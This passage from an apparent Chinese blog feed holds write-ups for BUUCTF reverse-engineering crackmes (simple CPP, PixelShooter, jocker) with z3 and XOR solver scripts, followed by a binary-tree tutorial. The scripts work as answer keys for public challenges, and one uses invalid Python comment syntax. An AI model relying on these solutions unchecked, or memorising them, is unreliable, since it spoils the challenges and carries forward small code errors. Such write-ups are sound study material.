class="number">0x67616c66</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">0x0</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">0x0</span>,(<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">0x0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">btea</span>(v, -n, k);</span><br><span class="line"><span class="comment">//    printf(&quot;解密后的数据：%x %x %x %x %x %x\n&quot;, v[0], v[1],v[2],v[3],v[4],v[5]);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;<span class="number">6</span> ; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>,v[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后把的出来的16进制转换成字符，注意小端序</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【buu】[GXYCTF2019]simple CPP</title>
      <link href="/2024/07/30/%E3%80%90buu%E3%80%91%5BGXYCTF2019%5Dsimple%20CPP/"/>
      <url>/2024/07/30/%E3%80%90buu%E3%80%91%5BGXYCTF2019%5Dsimple%20CPP/</url>
      
        <content type="html"><![CDATA[<h1 id="【buu】-GXYCTF2019-simple-CPP"><a href="#【buu】-GXYCTF2019-simple-CPP" class="headerlink" title="【buu】[GXYCTF2019]simple CPP"></a>【buu】[GXYCTF2019]simple CPP</h1><hr><p>这题主要是分析函数，就是 CPP 反编译后的那一坨有点绕</p><p>也是看了别的师傅的 wp 才慢慢理解</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/put_in.png" alt="put_in"></p><p>这里是动调后才知道这个函数是输入，把函数名字更改更好理解</p><p>下面的 if 判断语句中的 **v40 - 5 &gt; 25 **已经表明了输入的字符长度不能超过 <strong>30</strong></p><p>然后是一段意义不明的函数段</p><hr><p>接着到了这里</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/xor_encry.png" alt="xor_encry"></p><p>这里也有一些意义不明</p><p>动调发现，v41 和 qword_7FF7A0466060 都百年成了 0x1F</p><p>所以 v9 的值就是输入的 flag</p><p>走完循环后 v10 就变成了 <strong>i_will_check_is_debug_or_not</strong></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/v12.png" alt="v12"></p><p>v6 就是输入的 flag 和 v10 进行逐步异或</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/%E8%B5%8B%E5%80%BC.png" alt="赋值"></p><p>这也是有点抽象 v43 上面已经说了不能超过 30</p><p>而这里给了个 <strong>if ( (int)v43 &gt; 30 )和 if ( (int)v43 &lt;&#x3D; 0 )</strong></p><p>否则会前往表示 flag 格式错误的语句</p><p>看正确情况下的赋值语句，这里是将输入的 flag 每 8 位分成一组，分别赋值给 v14，v13，v12，v11，这里 v11 只有 4 位前三个都是 8 位</p><p>下面有一小段没有截图截到</p><p>那是把 v14，v13，v12，v11 又赋值给 v18[0]，v18[1]，v18[2]，v18[3]</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGXYCTF2019%5Dsimple%20CPP/%E8%B5%8B%E5%80%BC2%E4%B8%8E%E5%AF%86%E6%96%87.png" alt="赋值2与密文"></p><p>正确的情况下是不会走 lable_27 的</p><p>所以应该是走 lable_28</p><p>这里是一大串赋值与运算操作</p><p>关键部分是那几个 if 语句</p><p>用 z3 约束求解器把</p><p>求完的值拼起来追溯到头就是 flag 和 v10 异或后的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span>*</span><br><span class="line">v0 = BitVec(<span class="string">&#x27;v0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">v1 = BitVec(<span class="string">&#x27;v1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">v2 = BitVec(<span class="string">&#x27;v2&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">v3 = BitVec(<span class="string">&#x27;v3&#x27;</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="comment">#添加约束条件</span></span><br><span class="line">s.add(v2 &amp; ~v0 == <span class="number">1176889593874</span>)</span><br><span class="line">s.add((v2 &amp; ~v1) &amp; v0 | v2 &amp; ((v1 &amp; v0) | v1 &amp; ~v0 | ~(v1 | v0)) == <span class="number">577031497978884115</span>)</span><br><span class="line">s.add((v2 &amp; ~v0) | (v1 &amp; v0) | (v2 &amp; ~v1) | (v0 &amp; ~v1) == <span class="number">4483974544037412639</span>)</span><br><span class="line">s.add(((v2 &amp; ~v0) | (v1 &amp; v0) | (v2 &amp; ~v1) | (v0 &amp; ~v1))^v3 == <span class="number">4483974543195470111</span>)</span><br><span class="line">s.add(((v2 &amp; ~v0) | (v1 &amp; v0) | v1 &amp; v2) == (~v0 &amp; v2 | <span class="number">864693332579200012</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否有解</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="comment"># 如果有解，打印模型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;6666&quot;</span>)</span><br><span class="line">    <span class="comment"># print chr</span></span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v0 =&quot;</span>, <span class="built_in">hex</span>(m[v0].as_long()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v1 =&quot;</span>, <span class="built_in">hex</span>(m[v1].as_long()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v2 =&quot;</span>, <span class="built_in">hex</span>(m[v2].as_long()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;v3 =&quot;</span>, <span class="built_in">hex</span>(m[v3].as_long()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution exists&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后拼起来和 v10 进行异或就是 flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x3e</span>,<span class="number">0x3a</span>,<span class="number">0x46</span>,<span class="number">0x05</span>,<span class="number">0x33</span>,<span class="number">0x28</span>,<span class="number">0x6f</span>,<span class="number">0x0d</span>,<span class="number">0xc</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x30</span>,<span class="number">0x08</span>,<span class="number">0x2c</span>,<span class="number">0x0c</span>,<span class="number">0x8</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x17</span>,<span class="number">0x15</span>,<span class="number">0x3e</span>,<span class="number">0x30</span>,<span class="number">0x13</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x06</span>,<span class="number">0x00</span>]</span><br><span class="line">v12 = <span class="string">&#x27;i_will_check_is_debug_or_not&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v12[i%<span class="number">27</span>]) ^ enc[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>这里程序执行完会发现不对</p><p>原题这里给了段 hint 第二组数据为 e!P0or_a，但是 buu 没有给</p><p>所以只要把相应部位换成 e!P0or_a 即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【unity逆向】【安卓re】【buu】[MRCTF2020]PixelShooter</title>
      <link href="/2024/07/29/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90%E5%AE%89%E5%8D%93re%E3%80%91%E3%80%90buu%E3%80%91%5BMRCTF2020%5DPixelShooter/"/>
      <url>/2024/07/29/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90%E5%AE%89%E5%8D%93re%E3%80%91%E3%80%90buu%E3%80%91%5BMRCTF2020%5DPixelShooter/</url>
      
        <content type="html"><![CDATA[<h1 id="【unity逆向】【安卓re】【buu】-MRCTF2020-PixelShooter"><a href="#【unity逆向】【安卓re】【buu】-MRCTF2020-PixelShooter" class="headerlink" title="【unity逆向】【安卓re】【buu】[MRCTF2020]PixelShooter"></a>【unity逆向】【安卓re】【buu】[MRCTF2020]PixelShooter</h1><hr><p>这道题是一个<strong>安卓的unity小游戏逆向</strong></p><p>将下载的题目安装包拖入到jadx中并未发现一些有用的函数</p><p>于是就想着是不是libmain.so有相关函数</p><p>将libmain拖入到ida中也并未发现有用的函数</p><p>想到这是个unity小游戏，于是又把Assembly-CSsharp.dll拖入到ILspy中</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BMRCTF2020%5DPixelShooter/ILspy.png" alt="ILspy"></p><p>查看UserString Heap的字符表发现了flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【另一种smc】【对于time()与rand的一种处理方法】【buu】[网鼎杯 2020 青龙组]jocker</title>
      <link href="/2024/07/24/%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8Dsmc%E3%80%91%E3%80%90%E5%AF%B9%E4%BA%8Etime()%E4%B8%8Erand%E7%9A%84%E4%B8%80%E7%A7%8D%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%E3%80%91%E3%80%90buu%E3%80%91%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker/"/>
      <url>/2024/07/24/%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8Dsmc%E3%80%91%E3%80%90%E5%AF%B9%E4%BA%8Etime()%E4%B8%8Erand%E7%9A%84%E4%B8%80%E7%A7%8D%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%E3%80%91%E3%80%90buu%E3%80%91%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker/</url>
      
        <content type="html"><![CDATA[<h1 id="【另一种smc】【对于time-与rand的一种处理方法】【buu】-网鼎杯-2020-青龙组-jocker"><a href="#【另一种smc】【对于time-与rand的一种处理方法】【buu】-网鼎杯-2020-青龙组-jocker" class="headerlink" title="【另一种smc】【对于time()与rand的一种处理方法】【buu】[网鼎杯 2020 青龙组]jocker"></a>【另一种smc】【对于time()与rand的一种处理方法】【buu】[网鼎杯 2020 青龙组]jocker</h1><hr><p>这次的smc不同于之前的那道，这次的smc是有名字的和一定特征解smc函数的</p><p>而不是想上次要在一个大段中寻找插入的函数</p><hr><p>查壳无壳32，ida</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/main.png" alt="main"></p><p>这个栈平衡不会影响程序调试，先不管它</p><p>这里的encrypt跟进后是没有伪代码而只有汇编代码，而且汇编代码也是非常的匪夷所思，</p><p>但是下面有个186次循环是来解它的变成正确的函数的smc</p><p>所以这个题是要动调</p><p>回到main在for循环打个断点</p><p>由于v7要等于24，所以输入一个长度为24的字符串</p><p>然后会在for循环处停下</p><p>Destination是把输入的字符串未经处理复制过去</p><hr><p>切到汇编界面<img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/smc.png" alt="smc"></p><p>这个地方就是smc</p><p>进行完循环后会停在左面的块中，这时停下，去解密encrypt与finally</p><p>注意找好硬编码 <strong>55 89</strong> ，这里会有两端函数，encrypt下面就是finally</p><p>这里要解密2个函数</p><hr><p>然后进入encrypt</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/enc.png" alt="enc"></p><p>这里是要要让输入的字符和buffer进行异或等于403040</p><p>写个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;hahahaha_do_you_find_me?&#x27;</span></span><br><span class="line"></span><br><span class="line">v21 = [<span class="number">14</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">5</span>, <span class="number">88</span>, <span class="number">86</span>, <span class="number">62</span>, <span class="number">6</span>, <span class="number">12</span>,  <span class="number">60</span>, <span class="number">31</span>, <span class="number">87</span>, <span class="number">20</span>, <span class="number">107</span>, <span class="number">87</span>, <span class="number">89</span>, <span class="number">13</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">19</span>):</span><br><span class="line">    v21[j] ^= <span class="built_in">ord</span>(<span class="built_in">str</span>[j])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(v21[j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后发现flag还少一部分</p><hr><p>回到main跟进finally</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Djoker/finally.png" alt="finally"></p><p>这里有个获取当时时间和伪随机的复制</p><p>这个if会有点匪夷所思，不过根据encrypt可知这也可能是要异或</p><p>问gpt是说这里if中的 !&#x3D; 判断可以视为异或，</p><p>也就是说 v3 ^ a1 &#x3D; v4</p><p>不过我们并不知道这个异或的值</p><p>因此我们需要进行一个逆运算操作来求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;hahahaha_do_you_find_me?&#x27;</span></span><br><span class="line"></span><br><span class="line">str1 = [<span class="number">0X25</span>,<span class="number">0X74</span>,<span class="number">0X70</span>,<span class="number">0X26</span>,<span class="number">0X3A</span>]</span><br><span class="line">xor = <span class="number">0X3A</span> ^ <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>)//来求异或的值</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    str1[i] ^= xor</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(str1[i]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样求出了剩下的flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【二叉树】【数据结构】【buu】[GUET-CTF2019]number_game</title>
      <link href="/2024/07/23/%E3%80%90%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E3%80%90buu%E3%80%91%5BGUET-CTF2019%5Dnumber_game/"/>
      <url>/2024/07/23/%E3%80%90%E4%BA%8C%E5%8F%89%E6%A0%91%E3%80%91%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E3%80%91%E3%80%90buu%E3%80%91%5BGUET-CTF2019%5Dnumber_game/</url>
      
        <content type="html"><![CDATA[<h1 id="【二叉树】【数据结构】【buu】-GUET-CTF2019-number-game"><a href="#【二叉树】【数据结构】【buu】-GUET-CTF2019-number-game" class="headerlink" title="【二叉树】【数据结构】【buu】[GUET-CTF2019]number_game"></a>【二叉树】【数据结构】【buu】[GUET-CTF2019]number_game</h1><h2 id="【二叉树】"><a href="#【二叉树】" class="headerlink" title="【二叉树】"></a>【二叉树】</h2><hr><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p>[详细图解二叉树四种遍历(前序中序后序层次遍历)]<a href="https://blog.csdn.net/m0_68681879/article/details/127847415?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172170617216800178534776%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172170617216800178534776&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127847415-null-null.142">https://blog.csdn.net/m0_68681879/article/details/127847415?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172170617216800178534776%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172170617216800178534776&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127847415-null-null.142</a></p><p>[二叉树遍历的实现（超详细解析，小白必看系列）]<a href="https://blog.csdn.net/weixin_45031801/article/details/133747485?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172171563016800182746442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-133747485-null-null.142">https://blog.csdn.net/weixin_45031801/article/details/133747485?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172171563016800182746442&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-133747485-null-null.142</a></p><p>[数据结构——顺序队列与链式队列的实现]<a href="https://blog.csdn.net/m0_74712453/article/details/135351817?spm=1001.2014.3001.5502">https://blog.csdn.net/m0_74712453/article/details/135351817?spm=1001.2014.3001.5502</a></p><p>[数据结构——二叉树四种遍历的实现]<a href="https://blog.csdn.net/m0_74712453/article/details/135360309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172171563016800182746442&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-135360309-null-null.142">https://blog.csdn.net/m0_74712453/article/details/135360309?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172171563016800182746442%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172171563016800182746442&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-135360309-null-null.142</a></p><p>[东哥带你刷二叉树（纲领篇）]<a href="https://labuladong.online/algo/essential-technique/binary-tree-summary/">https://labuladong.online/algo/essential-technique/binary-tree-summary/</a></p><hr><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="一、树的概念"><a href="#一、树的概念" class="headerlink" title="一、树的概念"></a>一、树的概念</h4><h5 id="1、树的定义"><a href="#1、树的定义" class="headerlink" title="1、树的定义"></a>1、树的定义</h5><p>1）树<br>  树是 n(n≥0) 个结点的有限集合。当 n&gt;0 时，它是一棵非空树，满足如下条件：<br>    1）有且仅有一个特定的结点，称为根结点Root；<br>    2）除根结点外，其余结点分为 m 个互不相交的有限集合 T1、T2、…………、Tm，其中每一个 Ti(1≤i≤m) 又是一棵树，并且为根结点 Root 的子树。如图所示，代表的是一棵以 a 为根结点的树。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/tree.png" alt="tree"></p><p>2）空树<br>  当 n&#x3D;0，也就是 0 个结点的情况也是树，它被称为空树。</p><p>3）子树<br>  树的定义用到了递归的思想。即树的定义中还是用到了树的概念，如图所示，T1 和 T2 就是结点 a 的子树。结点 d、g、h、i 组成的树又是结点 b 的子树等等。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/kidTree.png" alt="kidTree"></p><p>  子树的个数没有限制，但是它们一定是互不相交的，如下图所示的就不是树。因为在这两个图中，a 的子树都有相交的边。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/notTree.png" alt="notTree"></p><h5 id="2、结点的定义"><a href="#2、结点的定义" class="headerlink" title="2、结点的定义"></a>2、结点的定义</h5><p>  树的结点包含一个 数据域 和 m 个 指针域 用来指向它的子树。结点的种类分为：根结点、叶子结点、内部结点。结点拥有子树的个数被称为 结点的度。树中各个结点度的最大值被称为 树的度。</p><p>1）根结点<br>  一棵树的根结点只有一个。</p><p>2）叶子结点<br>  度为 0 的结点被称为 叶子结点 或者 终端结点。叶子结点的不指向任何子树。</p><p>3）内部结点<br>  除了根结点和叶子结点以外的结点，被称为内部结点。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/points.png" alt="points"></p><p>  如上图所示，红色结点 为根结点，蓝色结点 为内部结点，黄色结点 为叶子结点。</p><p>3、结点间关系<br>1）孩子结点<br>  对于某个结点，它的子树的根结点，被称为该结点的 孩子结点。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/chilTree.png" alt="chilTree"></p><p>  如上图所示，黄色结点 d 是 红色结点 b 的孩子结点。</p><p>2）父结点<br>  而该结点被称为孩子结点的 父结点。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/faTree.png" alt="faTree"></p><p>  如上图所示，蓝色结点 a 是 红色结点 b 的父结点。</p><p>3）兄弟结点<br>  同一父结点下的孩子结点，互相称为 兄弟结点。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/broTree.png" alt="broTree"></p><p>  如上图所示，绿色结点 c 和 红色结点 b 互为兄弟结点。</p><p>4、树的深度<br>  结点的层次从根结点开始记为第 1 层，如果某结点在第 i 层，则它的子树的根结点就在第i+1 层，树中结点的最大层次称为 树的深度。<br>  如下图所示，代表的是一棵深度为 4 的树。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/treeDeepth.png" alt="treeDeepth"></p><p>5、森林的定义<br>  森林是 m 棵 互不相交的树的集合，对于树的每个结点而言，其子树集合就是森林。<br>  如图所示，b 和 c 两棵子树组成的集合就是一个森林。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/forest.png" alt="forest"></p><p>二、二叉树的概念<br>1、二叉树的性质<br>  二叉树是一种树，它有如下几个特征：<br>    1）每个结点最多 2 棵子树，即每个结点的孩子结点个数为 0、1、2；<br>    2）这两棵子树是有顺序的，分别叫：左子树 和 右子树；<br>    3）如果只有一棵子树的情况，也需要区分顺序，如图所示：</p><p>  b 为 a 的左子树；</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/leftKidTree.png" alt="leftKidTree"></p><p>  c 为 a 的右子树；、</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/righjtKidTree.png" alt="righjtKidTree"></p><p>2、特殊二叉树<br>1）斜树<br>  所有结点都只有左子树的二叉树被称为左斜树。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/leftTree.png" alt="leftTree"></p><p>  所有结点都只有右子树的二叉树被称为右斜树。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/rightTree.png" alt="rightTree"></p><p>  斜树有点类似线性表，所以线性表可以理解为一种特殊形式的树。</p><p>2）满二叉树<br>  对于一棵二叉树，如果它的所有根结点和内部结点都存在左右子树，且所有叶子结点都在同一层，这样的树就是满二叉树。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/fullTree.png" alt="fullTree"></p><p>  满二叉树有如下几个特点：<br>    1）叶子结点一定在最后一层；<br>    2）非叶子结点的度为 2；<br>    3）深度相同的二叉树，满二叉树的结点个数最多，为 （其中 h 代表深度）。</p><p>2）完全二叉树<br>  对一棵具有 n 个结点的二叉树按照层序进行编号，如果编号 i 的结点和同样深度的满二叉树中的编号 i 的结点在二叉树中位置完全相同，则被称为 完全二叉树。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/perfectTree.png" alt="perfectTree"></p><p>  满二叉树一定是完全二叉树，而完全二叉树则不一定是满二叉树。<br>  完全二叉树有如下几个特点：<br>    1）叶子结点只能出现在最下面两层。<br>    2）最下层的叶子结点一定是集中在左边的连续位置；倒数第二层如果有叶子结点，一定集中在右边的连续位置。<br>    3）如果某个结点度为 1，则只有左子树，即 不存在只有右子树 的情况。<br>    4）同样结点数的二叉树，完全二叉树的深度最小。</p><p>  如下图所示，就不是一棵完全二叉树，因为 5 号结点没有右子树，但是 6 号结点是有左子树的，不满足上述第 2 点。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/notPErfectTree.png" alt="notPErfectTree"></p><h5 id="3、二叉树的性质"><a href="#3、二叉树的性质" class="headerlink" title="3、二叉树的性质"></a>3、二叉树的性质</h5><p>  接下来我们来看下，二叉树有哪些重要的性质。</p><p>1）性质1<br>  <strong>【性质1】二叉树的第 i(i≥1) 层上至多有 2<sup>i-1</sup> 个结点。</strong></p><p>  既然是至多，就只需要考虑满二叉树的情况，对于满二叉树而言，当前层的结点数是上一层的两倍，第一层的结点数为 1，所以第 i 的结点数可以通过等比数列公式计算出来，为2<sup>i-1</sup> 。</p><p>2）性质2<br>  <strong>【性质2】深度为 h 的二叉树至多有 2<sup>h</sup>-1结点。</strong></p><p>  对于任意一个深度为 h 的二叉树，满二叉树的结点数一定是最多的，所以我们可以拿满二叉树进行计算，它的每一层的结点数为1、2、4、8 …、2<sup>h-1</sup>。<br>  利用等比数列求和公式，得到总的结点数为：1+2+4+8+ …+2<sup>h-1</sup>&#x3D;2<sup>h</sup>-1</p><p>3）性质3<br>  <strong>【性质3】对于任意一棵二叉树 T，如果叶子结点数为 x0，度为 2 的结点数为 x2，则x0&#x3D;x2+1</strong></p><p>  令 x1 代表度 为 1 的结点数，总的结点数为 n，则有：<strong>n&#x3D;x0+x1+x2</strong>  ……①<br>  任意一个结点到它孩子结点的连线我们称为这棵树的一条边，对于任意一个非空树而言，边数等于结点数减一，令边数为 e，则有：<strong>e&#x3D;n−1</strong> ……②</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BGUET-CTF2019%5Dnumber_game/%E6%80%A7%E8%B4%A83.png" alt="性质3"></p><p>对于度为 1 的结点，可以提供 1 条边，如图中的<strong>黄色结点</strong>；对于度为 2 的结点，可以提供 2 条边，如图中的<strong>红色结点</strong>。所以边数又可以通过度为 1 和 2 的结点数计算得出：<strong>e&#x3D;x1+2x2</strong>  ……③              </p><p>联立上述①②③三个等式，得到：<strong>e&#x3D;n−1&#x3D;x0+x1+x2−1&#x3D;x1+2x2</strong></p><p>化简后，得证：<strong>x0&#x3D;x2+1</strong>  </p><p>4）性质4<br>  **【性质4】具有 n 个结点的完全二叉树的深度为 **[log2]n+1</p><p>  由【性质2】可得，深度为 ℎh 的二叉树至多有<strong>2<sup>h</sup>-1</strong>个结点。所以，假设一棵树的深度为 h，它的结点数为 n，则必然满足：<strong>n≤2<sup>h</sup>-1</strong></p><p>由于是完全二叉树，它一定比深度为 ℎ−1h−1 的结点数要多，即：<strong>2<sup>h-1</sup> - 1 &lt; n</strong></p><p>将上述两个不等式，稍加整理，得到：2<sup>h-1</sup> ≤ n &lt; 2<sup>h</sup> </p><p>然后，对不等式两边取以2为底的对数，得到：h-1≤[log2]n+1 &lt;h</p><p>这里，由于 h 一定是整数，所以有：h &#x3D; [log2]n+1</p><h4 id="二、二叉树的储存和创建"><a href="#二、二叉树的储存和创建" class="headerlink" 